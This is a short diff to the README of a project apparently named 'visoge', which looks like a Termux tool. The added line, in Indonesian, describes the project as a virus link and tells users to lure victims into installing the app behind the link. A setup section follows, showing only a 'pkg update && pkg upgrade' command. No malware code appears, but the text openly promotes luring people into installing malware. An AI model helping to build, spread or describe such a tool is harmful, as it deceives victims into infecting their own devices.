@@ -1,5 +1,5 @@
 # visoge
-
+  Ini adalah link virus di mana kalian harus memancing korban agar mau menginstal aplikasi yang ada di dalam link
 
 # installting
 pkg update && pkg upgrade                
